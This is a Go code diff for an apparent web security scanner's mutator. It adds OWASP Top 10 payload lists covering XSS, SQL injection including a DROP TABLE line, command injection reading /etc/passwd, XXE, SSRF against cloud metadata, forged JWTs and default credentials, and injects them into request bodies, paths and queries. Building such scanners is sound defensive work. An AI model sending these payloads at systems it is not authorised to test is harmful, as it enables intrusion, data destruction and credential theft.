@@ -7,6 +7,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/google/uuid"
 	"github.com/owaspchecker/internal/common"
 )
 
@@ -26,45 +27,254 @@ func NewMutator() *Mutator {
 
 // initPayloads initializes the attack payloads
 func (m *Mutator) initPayloads() {
-	// XSS payloads
+	// A01:2021 - Broken Access Control
+	m.payloads[common.AttackBrokenAccessControl] = []common.Payload{
+		{Type: common.AttackBrokenAccessControl, Value: "/admin", Variant: "admin_access"},
+		{Type: common.AttackBrokenAccessControl, Value: "/api/admin", Variant: "api_admin"},
+		{Type: common.AttackBrokenAccessControl, Value: "/dashboard", Variant: "dashboard"},
+		{Type: common.AttackBrokenAccessControl, Value: "/user/admin", Variant: "user_admin"},
+		{Type: common.AttackBrokenAccessControl, Value: "/config", Variant: "config"},
+	}
+
+	m.payloads[common.AttackIDOR] = []common.Payload{
+		{Type: common.AttackIDOR, Value: "1", Variant: "user_id_1"},
+		{Type: common.AttackIDOR, Value: "0", Variant: "user_id_0"},
+		{Type: common.AttackIDOR, Value: "999999", Variant: "user_id_high"},
+		{Type: common.AttackIDOR, Value: "admin", Variant: "admin_id"},
+		{Type: common.AttackIDOR, Value: "true", Variant: "boolean_id"},
+	}
+
+	m.payloads[common.AttackPrivilegeEscalation] = []common.Payload{
+		{Type: common.AttackPrivilegeEscalation, Value: "role=admin", Variant: "admin_role"},
+		{Type: common.AttackPrivilegeEscalation, Value: "role=superuser", Variant: "superuser_role"},
+		{Type: common.AttackPrivilegeEscalation, Value: "isAdmin=true", Variant: "admin_flag"},
+		{Type: common.AttackPrivilegeEscalation, Value: "privilege=all", Variant: "all_privileges"},
+	}
+
+	m.payloads[common.AttackJWTManipulation] = []common.Payload{
+		{Type: common.AttackJWTManipulation, Value: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.", Variant: "none_alg"},
+		{Type: common.AttackJWTManipulation, Value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.EGIM96RAZxOHrZcK_RBQUyHXF0pJ9tWcjaBFxsD4UaA", Variant: "weak_secret"},
+	}
+
+	// A02:2021 - Cryptographic Failures
+	m.payloads[common.AttackWeakCrypto] = []common.Payload{
+		{Type: common.AttackWeakCrypto, Value: "md5", Variant: "md5_hash"},
+		{Type: common.AttackWeakCrypto, Value: "sha1", Variant: "sha1_hash"},
+		{Type: common.AttackWeakCrypto, Value: "des", Variant: "des_encryption"},
+		{Type: common.AttackWeakCrypto, Value: "rc4", Variant: "rc4_encryption"},
+	}
+
+	m.payloads[common.AttackWeakHashing] = []common.Payload{
+		{Type: common.AttackWeakHashing, Value: "5f4dcc3b5aa765d61d8327deb882cf99", Variant: "md5_password"},
+		{Type: common.AttackWeakHashing, Value: "40bd001563085fc35165329ea1ff5c5ecbdbbeef", Variant: "sha1_password"},
+	}
+
+	m.payloads[common.AttackInsecureTransport] = []common.Payload{
+		{Type: common.AttackInsecureTransport, Value: "http://", Variant: "http_protocol"},
+		{Type: common.AttackInsecureTransport, Value: "ftp://", Variant: "ftp_protocol"},
+		{Type: common.AttackInsecureTransport, Value: "telnet://", Variant: "telnet_protocol"},
+	}
+
+	// A03:2021 - Injection
 	m.payloads[common.AttackXSS] = []common.Payload{
 		{Type: common.AttackXSS, Value: "<script>alert(1)</script>", Variant: "basic"},
 		{Type: common.AttackXSS, Value: "\"><img src=x onerror=alert(1)>", Variant: "img_onerror"},
 		{Type: common.AttackXSS, Value: "javascript:alert(1)", Variant: "javascript_protocol"},
 		{Type: common.AttackXSS, Value: "<svg onload=alert(1)>", Variant: "svg_onload"},
 		{Type: common.AttackXSS, Value: "'><script>alert(1)</script>", Variant: "quote_break"},
+		{Type: common.AttackXSS, Value: "<iframe src=javascript:alert(1)>", Variant: "iframe"},
+		{Type: common.AttackXSS, Value: "';alert(1);//", Variant: "js_injection"},
 	}
 
-	// SQL Injection payloads
 	m.payloads[common.AttackSQLi] = []common.Payload{
 		{Type: common.AttackSQLi, Value: "' OR '1'='1", Variant: "boolean_based"},
 		{Type: common.AttackSQLi, Value: "'; WAITFOR DELAY '0:0:5'--", Variant: "time_based"},
 		{Type: common.AttackSQLi, Value: "' UNION SELECT NULL--", Variant: "union_based"},
 		{Type: common.AttackSQLi, Value: "' AND 1=1--", Variant: "and_based"},
 		{Type: common.AttackSQLi, Value: "'; DROP TABLE users--", Variant: "drop_table"},
+		{Type: common.AttackSQLi, Value: "' OR 1=1#", Variant: "mysql_comment"},
+		{Type: common.AttackSQLi, Value: "' OR 1=1/*", Variant: "mysql_comment_block"},
 	}
 
-	// XXE payloads
-	m.payloads[common.AttackXXE] = []common.Payload{
-		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Variant: "file_read"},
-		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>`, Variant: "ssrf"},
-		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>`, Variant: "php_filter"},
-	}
-
-	// SSRF payloads
-	m.payloads[common.AttackSSRF] = []common.Payload{
-		{Type: common.AttackSSRF, Value: "http://127.0.0.1:80/", Variant: "localhost_80"},
-		{Type: common.AttackSSRF, Value: "http://127.0.0.1:22/", Variant: "localhost_22"},
-		{Type: common.AttackSSRF, Value: "http://169.254.169.254/latest/meta-data/", Variant: "aws_metadata"},
-		{Type: common.AttackSSRF, Value: "http://metadata.google.internal/", Variant: "gcp_metadata"},
-	}
-
-	// Command Injection payloads
 	m.payloads[common.AttackCommandInj] = []common.Payload{
 		{Type: common.AttackCommandInj, Value: "; cat /etc/passwd", Variant: "file_read"},
 		{Type: common.AttackCommandInj, Value: "| whoami", Variant: "command_exec"},
 		{Type: common.AttackCommandInj, Value: "`id`", Variant: "backticks"},
 		{Type: common.AttackCommandInj, Value: "$(id)", Variant: "dollar_parens"},
+		{Type: common.AttackCommandInj, Value: "& dir", Variant: "windows_dir"},
+		{Type: common.AttackCommandInj, Value: "|| ping -c 1 127.0.0.1", Variant: "ping_test"},
+	}
+
+	m.payloads[common.AttackLDAPInjection] = []common.Payload{
+		{Type: common.AttackLDAPInjection, Value: "*)(uid=*))(|(uid=*", Variant: "ldap_injection"},
+		{Type: common.AttackLDAPInjection, Value: "admin)(&)", Variant: "ldap_admin"},
+		{Type: common.AttackLDAPInjection, Value: "*", Variant: "ldap_wildcard"},
+	}
+
+	m.payloads[common.AttackNoSQLInjection] = []common.Payload{
+		{Type: common.AttackNoSQLInjection, Value: "{\"$ne\": null}", Variant: "mongo_not_equal"},
+		{Type: common.AttackNoSQLInjection, Value: "{\"$gt\": \"\"}", Variant: "mongo_greater"},
+		{Type: common.AttackNoSQLInjection, Value: "{\"$where\": \"1==1\"}", Variant: "mongo_where"},
+	}
+
+	m.payloads[common.AttackHeaderInjection] = []common.Payload{
+		{Type: common.AttackHeaderInjection, Value: "admin\r\nX-Forwarded-For: 127.0.0.1", Variant: "crlf_injection"},
+		{Type: common.AttackHeaderInjection, Value: "admin%0d%0aX-Forwarded-For: 127.0.0.1", Variant: "url_encoded_crlf"},
+	}
+
+	m.payloads[common.AttackTemplateInjection] = []common.Payload{
+		{Type: common.AttackTemplateInjection, Value: "{{7*7}}", Variant: "jinja2"},
+		{Type: common.AttackTemplateInjection, Value: "${7*7}", Variant: "freemarker"},
+		{Type: common.AttackTemplateInjection, Value: "#{7*7}", Variant: "jsf"},
+	}
+
+	// A04:2021 - Insecure Design
+	m.payloads[common.AttackBusinessLogicFlaw] = []common.Payload{
+		{Type: common.AttackBusinessLogicFlaw, Value: "quantity=-1", Variant: "negative_quantity"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "price=0", Variant: "zero_price"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "amount=999999999", Variant: "overflow_amount"},
+	}
+
+	m.payloads[common.AttackRaceCondition] = []common.Payload{
+		{Type: common.AttackRaceCondition, Value: "concurrent=true", Variant: "race_condition"},
+		{Type: common.AttackRaceCondition, Value: "thread=1", Variant: "thread_id"},
+	}
+
+	// A05:2021 - Security Misconfiguration
+	m.payloads[common.AttackDefaultCredentials] = []common.Payload{
+		{Type: common.AttackDefaultCredentials, Value: "admin:admin", Variant: "admin_admin"},
+		{Type: common.AttackDefaultCredentials, Value: "root:root", Variant: "root_root"},
+		{Type: common.AttackDefaultCredentials, Value: "admin:password", Variant: "admin_password"},
+		{Type: common.AttackDefaultCredentials, Value: "guest:guest", Variant: "guest_guest"},
+	}
+
+	m.payloads[common.AttackDebugMode] = []common.Payload{
+		{Type: common.AttackDebugMode, Value: "debug=true", Variant: "debug_enabled"},
+		{Type: common.AttackDebugMode, Value: "development=true", Variant: "dev_mode"},
+		{Type: common.AttackDebugMode, Value: "test=true", Variant: "test_mode"},
+	}
+
+	m.payloads[common.AttackVerboseErrors] = []common.Payload{
+		{Type: common.AttackVerboseErrors, Value: "error=verbose", Variant: "verbose_errors"},
+		{Type: common.AttackVerboseErrors, Value: "debug=1", Variant: "debug_level"},
+	}
+
+	m.payloads[common.AttackMissingHeaders] = []common.Payload{
+		{Type: common.AttackMissingHeaders, Value: "X-Frame-Options: DENY", Variant: "frame_options"},
+		{Type: common.AttackMissingHeaders, Value: "X-Content-Type-Options: nosniff", Variant: "content_type_options"},
+		{Type: common.AttackMissingHeaders, Value: "X-XSS-Protection: 1; mode=block", Variant: "xss_protection"},
+	}
+
+	m.payloads[common.AttackWeakCORS] = []common.Payload{
+		{Type: common.AttackWeakCORS, Value: "Origin: https://evil.com", Variant: "evil_origin"},
+		{Type: common.AttackWeakCORS, Value: "Origin: null", Variant: "null_origin"},
+		{Type: common.AttackWeakCORS, Value: "Origin: *", Variant: "wildcard_origin"},
+	}
+
+	// A06:2021 - Vulnerable and Outdated Components
+	m.payloads[common.AttackKnownVulnerability] = []common.Payload{
+		{Type: common.AttackKnownVulnerability, Value: "log4j", Variant: "log4shell"},
+		{Type: common.AttackKnownVulnerability, Value: "spring4shell", Variant: "spring_vulnerability"},
+		{Type: common.AttackKnownVulnerability, Value: "heartbleed", Variant: "openssl_vulnerability"},
+	}
+
+	m.payloads[common.AttackOutdatedComponent] = []common.Payload{
+		{Type: common.AttackOutdatedComponent, Value: "jquery-1.12.4", Variant: "old_jquery"},
+		{Type: common.AttackOutdatedComponent, Value: "bootstrap-3.4.1", Variant: "old_bootstrap"},
+		{Type: common.AttackOutdatedComponent, Value: "angular-1.7.9", Variant: "old_angular"},
+	}
+
+	m.payloads[common.AttackVersionDisclosure] = []common.Payload{
+		{Type: common.AttackVersionDisclosure, Value: "version=1.0.0", Variant: "version_info"},
+		{Type: common.AttackVersionDisclosure, Value: "build=2021", Variant: "build_info"},
+	}
+
+	// A07:2021 - Identification and Authentication Failures
+	m.payloads[common.AttackWeakAuth] = []common.Payload{
+		{Type: common.AttackWeakAuth, Value: "password=123456", Variant: "weak_password"},
+		{Type: common.AttackWeakAuth, Value: "password=password", Variant: "common_password"},
+		{Type: common.AttackWeakAuth, Value: "password=admin", Variant: "admin_password"},
+	}
+
+	m.payloads[common.AttackSessionFixation] = []common.Payload{
+		{Type: common.AttackSessionFixation, Value: "sessionid=fixed", Variant: "fixed_session"},
+		{Type: common.AttackSessionFixation, Value: "token=static", Variant: "static_token"},
+	}
+
+	m.payloads[common.AttackSessionTimeout] = []common.Payload{
+		{Type: common.AttackSessionTimeout, Value: "timeout=0", Variant: "no_timeout"},
+		{Type: common.AttackSessionTimeout, Value: "expires=never", Variant: "never_expires"},
+	}
+
+	m.payloads[common.AttackWeakPassword] = []common.Payload{
+		{Type: common.AttackWeakPassword, Value: "password=123", Variant: "numeric_password"},
+		{Type: common.AttackWeakPassword, Value: "password=abc", Variant: "alpha_password"},
+		{Type: common.AttackWeakPassword, Value: "password=123456789", Variant: "sequential_password"},
+	}
+
+	m.payloads[common.AttackBruteForce] = []common.Payload{
+		{Type: common.AttackBruteForce, Value: "attempt=1000", Variant: "high_attempts"},
+		{Type: common.AttackBruteForce, Value: "delay=0", Variant: "no_delay"},
+	}
+
+	// A08:2021 - Software and Data Integrity Failures
+	m.payloads[common.AttackInsecureDeserialization] = []common.Payload{
+		{Type: common.AttackInsecureDeserialization, Value: "O:8:\"stdClass\":0:{}", Variant: "php_object"},
+		{Type: common.AttackInsecureDeserialization, Value: "{\"@type\":\"java.util.ArrayList\"}", Variant: "java_object"},
+		{Type: common.AttackInsecureDeserialization, Value: "{\"rce\":\"true\"}", Variant: "json_rce"},
+	}
+
+	m.payloads[common.AttackCodeInjection] = []common.Payload{
+		{Type: common.AttackCodeInjection, Value: "eval('alert(1)')", Variant: "eval_injection"},
+		{Type: common.AttackCodeInjection, Value: "exec('whoami')", Variant: "exec_injection"},
+		{Type: common.AttackCodeInjection, Value: "system('id')", Variant: "system_injection"},
+	}
+
+	m.payloads[common.AttackSupplyChainAttack] = []common.Payload{
+		{Type: common.AttackSupplyChainAttack, Value: "package=malicious", Variant: "malicious_package"},
+		{Type: common.AttackSupplyChainAttack, Value: "dependency=compromised", Variant: "compromised_dependency"},
+	}
+
+	// A09:2021 - Security Logging and Monitoring Failures
+	m.payloads[common.AttackLogInjection] = []common.Payload{
+		{Type: common.AttackLogInjection, Value: "admin\nadmin", Variant: "log_injection"},
+		{Type: common.AttackLogInjection, Value: "admin\r\nadmin", Variant: "log_crlf"},
+		{Type: common.AttackLogInjection, Value: "admin%0aadmin", Variant: "log_url_encoded"},
+	}
+
+	m.payloads[common.AttackLogBypass] = []common.Payload{
+		{Type: common.AttackLogBypass, Value: "logging=false", Variant: "disable_logging"},
+		{Type: common.AttackLogBypass, Value: "audit=off", Variant: "disable_audit"},
+	}
+
+	m.payloads[common.AttackAuditTrailTampering] = []common.Payload{
+		{Type: common.AttackAuditTrailTampering, Value: "timestamp=0", Variant: "zero_timestamp"},
+		{Type: common.AttackAuditTrailTampering, Value: "user=anonymous", Variant: "anonymous_user"},
+	}
+
+	// A10:2021 - Server-Side Request Forgery
+	m.payloads[common.AttackSSRF] = []common.Payload{
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:80/", Variant: "localhost_80"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:22/", Variant: "localhost_22"},
+		{Type: common.AttackSSRF, Value: "http://169.254.169.254/latest/meta-data/", Variant: "aws_metadata"},
+		{Type: common.AttackSSRF, Value: "http://metadata.google.internal/", Variant: "gcp_metadata"},
+		{Type: common.AttackSSRF, Value: "http://169.254.169.254/latest/user-data/", Variant: "aws_userdata"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:6379/", Variant: "redis"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:27017/", Variant: "mongodb"},
+	}
+
+	m.payloads[common.AttackXXE] = []common.Payload{
+		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Variant: "file_read"},
+		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>`, Variant: "ssrf"},
+		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>`, Variant: "php_filter"},
+		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`, Variant: "expect_protocol"},
+	}
+
+	m.payloads[common.AttackOpenRedirect] = []common.Payload{
+		{Type: common.AttackOpenRedirect, Value: "https://evil.com", Variant: "external_site"},
+		{Type: common.AttackOpenRedirect, Value: "//evil.com", Variant: "protocol_relative"},
+		{Type: common.AttackOpenRedirect, Value: "javascript:alert(1)", Variant: "javascript_protocol"},
+		{Type: common.AttackOpenRedirect, Value: "data:text/html,<script>alert(1)</script>", Variant: "data_protocol"},
 	}
 }
 
@@ -142,8 +352,16 @@ func (m *Mutator) mutateHeaders(req *common.RecordedRequest) []common.RecordedRe
 func (m *Mutator) mutateBody(req *common.RecordedRequest) []common.RecordedRequest {
 	var mutations []common.RecordedRequest
 
-	// Skip if no body
+	// If no body exists, create basic body mutations for testing
 	if req.Body == "" {
+		// Create JSON body mutations
+		jsonMutations := m.createJSONBodyMutations(req)
+		mutations = append(mutations, jsonMutations...)
+
+		// Create form body mutations
+		formMutations := m.createFormBodyMutations(req)
+		mutations = append(mutations, formMutations...)
+
 		return mutations
 	}
 
@@ -163,6 +381,82 @@ func (m *Mutator) mutateBody(req *common.RecordedRequest) []common.RecordedReque
 	if strings.Contains(req.ContentType, "application/xml") || strings.Contains(req.ContentType, "text/xml") {
 		xmlMutations := m.mutateXMLBody(req)
 		mutations = append(mutations, xmlMutations...)
+	}
+
+	return mutations
+}
+
+// createJSONBodyMutations creates JSON body mutations when no body exists
+func (m *Mutator) createJSONBodyMutations(req *common.RecordedRequest) []common.RecordedRequest {
+	var mutations []common.RecordedRequest
+
+	// Create basic JSON structure
+	baseJSON := map[string]interface{}{
+		"id":    "test",
+		"name":  "test",
+		"email": "test@test.com",
+		"data":  "test",
+	}
+
+	for attackType, payloads := range m.payloads {
+		for _, payload := range payloads {
+			// Create a copy of the JSON data
+			mutatedData := copyJSONMap(baseJSON)
+
+			// Inject payload into string values
+			m.injectPayloadIntoJSON(mutatedData, payload.Value)
+
+			// Convert back to JSON
+			mutatedBody, err := json.Marshal(mutatedData)
+			if err != nil {
+				continue
+			}
+
+			mutated := *req
+			mutated.ID = generateID()
+			mutated.Body = string(mutatedBody)
+			mutated.ContentType = "application/json"
+			mutated.Variant = fmt.Sprintf("json_%s_%s", attackType, payload.Variant)
+			mutated.Timestamp = time.Now()
+			mutations = append(mutations, mutated)
+		}
+	}
+
+	return mutations
+}
+
+// createFormBodyMutations creates form body mutations when no body exists
+func (m *Mutator) createFormBodyMutations(req *common.RecordedRequest) []common.RecordedRequest {
+	var mutations []common.RecordedRequest
+
+	// Create basic form data
+	baseForm := url.Values{}
+	baseForm.Set("id", "test")
+	baseForm.Set("name", "test")
+	baseForm.Set("email", "test@test.com")
+	baseForm.Set("data", "test")
+
+	for attackType, payloads := range m.payloads {
+		for _, payload := range payloads {
+			// Create a copy of the form data
+			mutatedForm := url.Values{}
+			for key, values := range baseForm {
+				mutatedForm[key] = values
+			}
+
+			// Inject payload into form values
+			for key := range mutatedForm {
+				mutatedForm.Set(key, payload.Value)
+			}
+
+			mutated := *req
+			mutated.ID = generateID()
+			mutated.Body = mutatedForm.Encode()
+			mutated.ContentType = "application/x-www-form-urlencoded"
+			mutated.Variant = fmt.Sprintf("form_%s_%s", attackType, payload.Variant)
+			mutated.Timestamp = time.Now()
+			mutations = append(mutations, mutated)
+		}
 	}
 
 	return mutations
@@ -258,7 +552,7 @@ func (m *Mutator) mutateXMLBody(req *common.RecordedRequest) []common.RecordedRe
 	return mutations
 }
 
-// mutateURL injects payloads into URL parameters
+// mutateURL injects payloads into URL parameters and path
 func (m *Mutator) mutateURL(req *common.RecordedRequest) []common.RecordedRequest {
 	var mutations []common.RecordedRequest
 
@@ -267,9 +561,37 @@ func (m *Mutator) mutateURL(req *common.RecordedRequest) []common.RecordedReques
 		return mutations
 	}
 
+	// URL Path mutations (for endpoints like /admin, /api, etc.)
+	for attackType, payloads := range m.payloads {
+		for _, payload := range payloads {
+			// Create path-based mutations
+			mutatedURL := *parsedURL
+			
+			// Add payload as a new path segment
+			if parsedURL.Path == "/" {
+				mutatedURL.Path = "/" + payload.Value
+			} else {
+				mutatedURL.Path = parsedURL.Path + "/" + payload.Value
+			}
+
+			mutated := *req
+			mutated.ID = generateID()
+			mutated.URL = mutatedURL.String()
+			mutated.Variant = fmt.Sprintf("path_%s_%s", attackType, payload.Variant)
+			mutated.Timestamp = time.Now()
+			mutations = append(mutations, mutated)
+		}
+	}
+
+	// URL Query parameter mutations
 	query := parsedURL.Query()
+	
+	// If no query parameters exist, create some common ones to inject into
 	if len(query) == 0 {
-		return mutations
+		commonParams := []string{"id", "user", "search", "q", "param", "value", "data"}
+		for _, param := range commonParams {
+			query.Set(param, "test")
+		}
 	}
 
 	for attackType, payloads := range m.payloads {
@@ -291,7 +613,7 @@ func (m *Mutator) mutateURL(req *common.RecordedRequest) []common.RecordedReques
 			mutated := *req
 			mutated.ID = generateID()
 			mutated.URL = mutatedURL.String()
-			mutated.Variant = fmt.Sprintf("url_%s_%s", attackType, payload.Variant)
+			mutated.Variant = fmt.Sprintf("query_%s_%s", attackType, payload.Variant)
 			mutated.Timestamp = time.Now()
 			mutations = append(mutations, mutated)
 		}
@@ -338,5 +660,5 @@ func copyJSONMap(original map[string]interface{}) map[string]interface{} {
 
 // generateID generates a unique ID
 func generateID() string {
-	return fmt.Sprintf("%d_%d", time.Now().UnixNano(), time.Now().UnixNano()%1000)
+	return uuid.New().String()
 }
